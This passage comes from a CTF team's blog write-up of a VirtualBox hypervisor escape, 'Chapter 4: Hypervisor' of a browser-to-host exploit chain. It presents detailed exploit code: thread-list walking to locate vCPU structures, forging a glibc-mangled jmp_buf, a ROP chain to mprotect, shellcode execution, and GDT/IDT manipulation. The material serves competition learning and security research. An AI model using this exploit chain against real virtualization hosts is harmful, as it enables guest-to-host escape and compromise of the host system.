+At this point, we noticed that <code class="language-plaintext highlighter-rouge">VBoxVMM.so</code> imported <code class="language-plaintext highlighter-rouge">setjmp</code> and <code class="language-plaintext highlighter-rouge">longjmp</code>.
+It seems that there is a pointer to a <code class="language-plaintext highlighter-rouge">jmp_buf</code> inside the virtual CPU struct that is filled by <code class="language-plaintext highlighter-rouge">setjmp</code> at the beginning of <code class="language-plaintext highlighter-rouge">IEMExecLots</code> or <code class="language-plaintext highlighter-rouge">iemExecOneInner</code>.
+Our plan was, to modify the pointer to <code class="language-plaintext highlighter-rouge">jmp_buf</code> to point to memory we control, then cause the <code class="language-plaintext highlighter-rouge">longjmp</code> to be hit.
+This way, we could control both RIP and RSP, allowing us to ROP!</p>
+
+<p>Naively, we thought that the virtual CPU struct was at a fixed offset from libc.
+Using that, we managed to overwrite the pointer to <code class="language-plaintext highlighter-rouge">jmp_buf</code> and then we tried to cause the <code class="language-plaintext highlighter-rouge">longjmp</code>.
+It seemed a simple <code class="language-plaintext highlighter-rouge">mov $0, (0)</code> (i.e. causing a fault) would be enough.
+Currently, we are only executing at most two instructions with IEM.
+However, the <code class="language-plaintext highlighter-rouge">jmp_buf</code> pointer was reset at the beginning of every <code class="language-plaintext highlighter-rouge">iemExecOneInner</code>.
+Therefore, we needed to be able to cause multiple instructions (of our choosing) to be emulated with IEM.
+Thankfully, the global VM struct has a flag called <code class="language-plaintext highlighter-rouge">fIemExecutesAll</code> that causes all instructions to be emulated.
+Hence, we simply write <code class="language-plaintext highlighter-rouge">1</code> to that flag and the next time we enter IEM, we will not leave it again.</p>
+
+<p>With this, we finally managed to trigger the call to <code class="language-plaintext highlighter-rouge">longjmp</code> with the first argument (i.e. the pointer to <code class="language-plaintext highlighter-rouge">jmp_buf</code>) controlled by us.
+However, we then encountered the next roadblock. With version <code class="language-plaintext highlighter-rouge">2.31</code> of glibc, it seems that RIP, RSP and RBP of the <code class="language-plaintext highlighter-rouge">jmp_buf</code> struct are “encrypted” with a secret value.
+Fortunately, this value is stored in the TLS section and since it is at a constant offset from libc, we were able to just read the value.
+Finally, we managed to get RIP and RSP control, allowing us to ROP.
+We built a ROP chain that would call <code class="language-plaintext highlighter-rouge">mprotect</code> to change a rw memory region (which we previously filled with shellcode) to rwx.</p>
+
+<p>Unfortunately, when we tried to run the full exploit, we noticed that the address of the virtual CPU struct was not actually at a fixed offset from libc.
+During the CTF, it was around this point where we noticed the existing rwx section and hence stopped pursuing this exploitation path.
+Still, how could you proceed to exploit this reliably?
+First we have to find a way to reliably get a pointer to the virtual CPU struct.
+By reading through the code, we noticed that the emulation thread would store a pointer to the virtual CPU struct in its TLS section.
+Therefore, we had to find a way to leak the TLS address of the emulation thread.
+Scouring glibc, we found out that there is a global linked list of all threads created by <code class="language-plaintext highlighter-rouge">libpthread</code>.
+Furthermore, the wrappers around <code class="language-plaintext highlighter-rouge">libpthread</code> in use by VirtualBox, would save the name of the thread in an allocation, which was findable by reading the <code class="language-plaintext highlighter-rouge">arg</code> field of the <code class="language-plaintext highlighter-rouge">struct pthread</code>.
+Combining all of this, we were able to iterate through all threads and find the ones responsible for emulating a virtual CPU:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="kt">uint64_t</span> <span class="n">pthread_freeres_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libpthread_got</span><span class="p">);</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pthread_freeres_addr</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">pthread_base</span> <span class="o">=</span> <span class="n">pthread_freeres_addr</span> <span class="o">-</span> <span class="n">libpthread_off</span><span class="p">;</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pthread_base</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">stack_used</span> <span class="o">=</span> <span class="n">pthread_base</span> <span class="o">+</span> <span class="n">stack_used_off</span><span class="p">;</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">stack_used</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">start_routine_off</span> <span class="o">=</span> <span class="mi">1600</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">fn_cookie_off</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">list_off</span> <span class="o">=</span> <span class="mi">704</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">tid_off</span> <span class="o">=</span> <span class="mi">720</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">arg_off</span> <span class="o">=</span> <span class="mi">1608</span><span class="p">;</span>
+    <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">name_off</span> <span class="o">=</span> <span class="mh">0x8e0</span><span class="p">;</span>
+
+    <span class="kt">uint64_t</span> <span class="n">tls_bases</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Iterating over all threads...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">curr_list</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">stack_used</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">curr_list</span> <span class="o">!=</span> <span class="n">stack_used</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">uint64_t</span> <span class="n">thread_ptr</span> <span class="o">=</span> <span class="n">curr_list</span> <span class="o">-</span> <span class="n">list_off</span><span class="p">;</span>
+        <span class="kt">uint64_t</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">thread_ptr</span> <span class="o">+</span> <span class="n">tid_off</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+        <span class="kt">uint64_t</span> <span class="n">start_routine</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">thread_ptr</span> <span class="o">+</span> <span class="n">start_routine_off</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">next_list</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">curr_list</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">arg</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">thread_ptr</span> <span class="o">+</span> <span class="n">arg_off</span><span class="p">);</span>
+        <span class="kt">uint64_t</span> <span class="n">name</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">arg</span> <span class="o">+</span> <span class="n">name_off</span><span class="p">);</span>
+        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Thread %d @ 0x%llx, start @ 0x%llx (0x%llx), next @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tid</span><span class="p">,</span> <span class="n">thread_ptr</span><span class="p">,</span> <span class="n">start_routine</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">next_list</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x0000302d544d45</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// EMT-0</span>
+            <span class="n">tls_bases</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">thread_ptr</span><span class="p">;</span>
+            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"This was EMT-0!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x0000312d544d45</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// EMT-1</span>
+            <span class="n">tls_bases</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">thread_ptr</span><span class="p">;</span>
+            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"This was EMT-1!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">curr_list</span> <span class="o">=</span> <span class="n">next_list</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can then follow some pointers and get some more of them:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="nf">get_vcpu_addr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">tls_base</span><span class="p">)</span> <span class="p">{</span>
+     <span class="kt">uint64_t</span> <span class="n">pUVCpu_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">tls_base</span> <span class="o">+</span> <span class="mh">0x358</span><span class="p">);</span>
+
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pUVCpu_addr</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">pUVM_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">pUVCpu_addr</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">UVM_magic</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">pUVM_addr</span><span class="p">);</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">UVM_magic</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">pVM_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">pUVCpu_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">pVCpu_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">pUVCpu_addr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">);</span>
+
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pUVM_addr</span><span class="p">);</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pVM_addr</span><span class="p">);</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">pVCpu_addr</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">vcpu_addr</span> <span class="o">=</span> <span class="n">pVCpu_addr</span><span class="p">;</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Found vcpu @ 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">vcpu_addr</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">vcpu_addr</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="kt">uint64_t</span> <span class="n">vcpu_addr</span> <span class="o">=</span> <span class="n">get_vcpu_addr</span><span class="p">(</span><span class="n">tls_bases</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="kt">uint64_t</span> <span class="n">vcpu2_addr</span> <span class="o">=</span> <span class="n">get_vcpu_addr</span><span class="p">(</span><span class="n">tls_bases</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Next we prepare our <code class="language-plaintext highlighter-rouge">jmp_buf</code>, the ROP chain and shellcode:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="kt">uint64_t</span> <span class="n">writable_memory</span> <span class="o">=</span> <span class="n">vcpu_addr</span> <span class="o">-</span> <span class="mh">0x2000</span><span class="p">;</span>
+    <span class="n">print_addr</span><span class="p">(</span><span class="n">writable_memory</span><span class="p">);</span>
+    <span class="n">jmp_buf_addr</span> <span class="o">=</span> <span class="n">writable_memory</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">writable_memory</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">writable_memory</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+    <span class="kt">uint64_t</span> <span class="n">fn_cookie</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">tls_bases</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">fn_cookie_off</span><span class="p">);</span>
+
+    <span class="cp">#define mangle_ptr(ptr) (_rotl((ptr ^ fn_cookie), 0x11))
+</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Preparing jmp_buf with cookie: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fn_cookie</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">rop_buf</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">shellcode_addr</span><span class="p">,</span> <span class="c1">// rdi</span>
+        <span class="n">pop_rsi_gadget_off</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">,</span>
+        <span class="mh">0x1000</span><span class="p">,</span> <span class="c1">// rsi</span>
+        <span class="n">pop_rdx_gadget_off</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">,</span>
+        <span class="mh">0x7</span><span class="p">,</span>
+        <span class="n">mprotect_libc_off</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">,</span>
+        <span class="n">shellcode_addr</span>
+    <span class="p">};</span>
+
+    <span class="k">struct</span> <span class="n">__jmp_buf</span> <span class="n">jumper</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">jumper</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">jumper</span><span class="p">));</span>
+    <span class="n">jumper</span><span class="p">.</span><span class="n">__rip</span> <span class="o">=</span> <span class="n">mangle_ptr</span><span class="p">(</span><span class="n">pop_rdi_gadget_off</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">);</span>
+    <span class="n">jumper</span><span class="p">.</span><span class="n">__rsp</span> <span class="o">=</span> <span class="n">mangle_ptr</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">);</span>
+    <span class="n">jumper</span><span class="p">.</span><span class="n">__rbp</span> <span class="o">=</span> <span class="n">mangle_ptr</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">);</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Writing jmp_buf</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">arb_write</span><span class="p">(</span><span class="n">jmp_buf_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jumper</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">jumper</span><span class="p">));</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Writing rop_buf</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">arb_write</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">,</span> <span class="n">rop_buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rop_buf</span><span class="p">));</span>
+
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_WARN</span> <span class="s">"Writing shellcode_pwn</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">arb_write</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">,</span> <span class="n">shellcode_pwn</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode_pwn</span><span class="p">));</span>
+
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Finally, we turn <code class="language-plaintext highlighter-rouge">fIemExecutesAll</code> on and overwrite the pointer to <code class="language-plaintext highlighter-rouge">jmp_buf</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="n">vcpu_jmp_buf</span> <span class="o">=</span> <span class="n">vcpu_addr</span> <span class="o">+</span> <span class="mh">0x738</span><span class="p">;</span>
+    <span class="n">vcpu2_jmp_buf</span> <span class="o">=</span> <span class="n">vcpu2_addr</span> <span class="o">+</span> <span class="mh">0x738</span><span class="p">;</span>
+
+    <span class="kt">uint64_t</span> <span class="n">vm_addr</span> <span class="o">=</span> <span class="n">arb_read64</span><span class="p">(</span><span class="n">vcpu_addr</span> <span class="o">+</span> <span class="mh">0x4880</span><span class="p">);</span>
+    <span class="c1">// overwrite fIemExecutesAll</span>
+    <span class="n">arb_write64</span><span class="p">(</span><span class="n">vm_addr</span> <span class="o">+</span> <span class="mh">0xb000</span><span class="p">,</span> <span class="mi">1</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">));</span>
+
+    <span class="c1">// you will see later</span>
+    <span class="n">do_finalize</span><span class="p">();</span>
+    <span class="c1">// overwrite jmp_buf pointer</span>
+    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
+        <span class="s">".byte 0x0f, 0x27</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"mov %%rcx, %%rbx</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">".byte 0x0f, 0x27</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"mov $0, (0)"</span>
+        <span class="o">::</span> <span class="s">"a"</span> <span class="p">(</span><span class="n">jmp_buf_addr</span><span class="p">),</span> <span class="s">"b"</span> <span class="p">(</span><span class="n">addr_to_offset</span><span class="p">(</span><span class="n">vcpu_jmp_buf</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">),</span> <span class="s">"c"</span> <span class="p">(</span><span class="n">addr_to_offset</span><span class="p">(</span><span class="n">vcpu2_jmp_buf</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">:</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It seems that this was still not enough and with some debugging we found out that it was still not switching to executing everything under IEM.
+Somebody figured out, that executin a <code class="language-plaintext highlighter-rouge">ud2</code> instruction while under IEM would then cause the reschedule to happen and hence executing everything under IEM.
+This is what <code class="language-plaintext highlighter-rouge">do_finalize</code> does:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">))</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint64_t</span> <span class="nf">do_finalize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="n">gdtr_t</span> <span class="n">curr_gdtr</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="kt">uint64_t</span> <span class="n">curr_gdtr_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">curr_gdtr</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">fake_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_gdtr</span><span class="p">;</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">finalize</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">mmio_addr</span><span class="p">,</span> <span class="n">curr_gdtr_ptr</span><span class="p">,</span> <span class="n">fake_ptr</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And <code class="language-plaintext highlighter-rouge">finalize</code>:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; rdi = idx, rsi = mmio, rdx = curr_gdtr, rcx = fake_gdtr</span>
+<span class="nf">.global</span> <span class="nv">finalize</span>
+<span class="nl">finalize:</span>
+<span class="nf">push</span> <span class="nb">rbx</span>
+<span class="nf">sgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+<span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rcx</span><span class="p">]</span>
+<span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdi</span>
+<span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">]</span>
+<span class="nf">ud2</span> <span class="c1">; will cause a fault to be raised and hence transition to always IEM</span>
+<span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="mh">0x18</span>
+<span class="nf">mov</span> <span class="nb">ss</span><span class="p">,</span> <span class="nb">rbx</span>
+<span class="nf">lgdt</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>
+<span class="nf">pop</span> <span class="nb">rbx</span>
+<span class="nf">ret</span>
+</code></pre></div></div>
+
+<p>Lastly, we install a custom IDT (which is similar to the GDT) to have a custom handler for when the <code class="language-plaintext highlighter-rouge">ud2</code> is executed:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;asm/desc.h&gt;</span><span class="cp">
+</span>
+<span class="n">gdtr_t</span> <span class="n">fake_idtr</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="n">gdt_entry</span> <span class="n">fake_idts</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
+
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="n">gdtr_t</span> <span class="n">lidt</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span>
+        <span class="s">"sidt %0"</span>
+        <span class="o">:</span> <span class="s">"=m"</span><span class="p">(</span><span class="n">lidt</span><span class="p">)</span> <span class="o">::</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+
+    <span class="kt">size_t</span> <span class="n">lit_size</span> <span class="o">=</span> <span class="n">lidt</span><span class="p">.</span><span class="n">limit</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">fake_idts</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_idts</span><span class="p">));</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">fake_idts</span><span class="p">,</span> <span class="n">lidt</span><span class="p">.</span><span class="n">base</span><span class="p">,</span> <span class="n">lit_size</span><span class="p">);</span>
+
+    <span class="n">set_bringup_idt_handler</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">fake_idts</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="n">int50_handler</span><span class="p">);</span>
+    <span class="n">fake_idtr</span><span class="p">.</span><span class="n">base</span> <span class="o">=</span> <span class="n">fake_idts</span><span class="p">;</span>
+    <span class="n">fake_idtr</span><span class="p">.</span><span class="n">limit</span> <span class="o">=</span> <span class="n">lidt</span><span class="p">.</span><span class="n">limit</span><span class="p">;</span>
+
+    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span>
+        <span class="s">"lidt %0"</span>
+        <span class="o">::</span> <span class="s">"m"</span><span class="p">(</span><span class="n">fake_idtr</span><span class="p">)</span> <span class="o">:</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+
+    <span class="p">...</span>
+
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="kr">naked</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">int50_handler</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
+        <span class="s">".byte 0x0f, 0x27</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"mov %%rcx, %%rbx</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">".byte 0x0f, 0x27</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"mov $0, (0)"</span>
+        <span class="o">::</span> <span class="s">"a"</span> <span class="p">(</span><span class="n">jmp_buf_addr</span><span class="p">),</span> <span class="s">"b"</span> <span class="p">(</span><span class="n">addr_to_offset</span><span class="p">(</span><span class="n">vcpu_jmp_buf</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">),</span> <span class="s">"c"</span> <span class="p">(</span><span class="n">addr_to_offset</span><span class="p">(</span><span class="n">vcpu2_jmp_buf</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">:</span> <span class="s">"memory"</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After all of this, we finally get our shellcode execution without having to rely on an RWX page provided to us by VirtualBox :).</p>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ul>
+  <li><a href="./fourchain-prologue">Prologue</a>: Introduction</li>
+  <li><a href="./fourchain-hole">Chapter 1: Hole</a>: Using the “hole” to pwn the V8 heap and some delicious Swiss cheese.</li>
+  <li><a href="./fourchain-sandbox">Chapter 2: Sandbox</a>: Pwning the Chrome Sandbox using <code class="language-plaintext highlighter-rouge">Sandbox</code>.</li>
+  <li><a href="./fourchain-kernel">Chapter 3: Kernel</a>: Chaining the Cross-Cache Cred Change</li>
+  <li><strong><a href="./fourchain-hv">Chapter 4: Hypervisor</a> (You are here)</strong></li>
+  <li><a href="./fourchain-fullchain">Chapter 5: One for All</a>: Uncheesing a Challenge and GUI Troubles</li>
+  <li><a href="./fourchain-epilogue">Epilogue</a>: Closing thoughts</li>
+</ul>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
